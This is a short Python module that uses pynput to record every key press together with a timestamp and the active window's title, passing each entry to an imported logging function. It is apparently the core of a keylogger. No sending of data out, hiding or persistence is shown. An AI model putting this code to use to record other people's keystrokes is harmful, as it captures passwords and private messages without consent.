from pynput import keyboard

from .utils import get_time, get_active_window
from .logging import log


def on_press(key):
    key_str = str(key.char) if hasattr(key, 'char') else str(key)  # Get key as string
    msg = f'{get_time()} [{get_active_window()}] {key_str}'
    log(msg)

def initialize():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        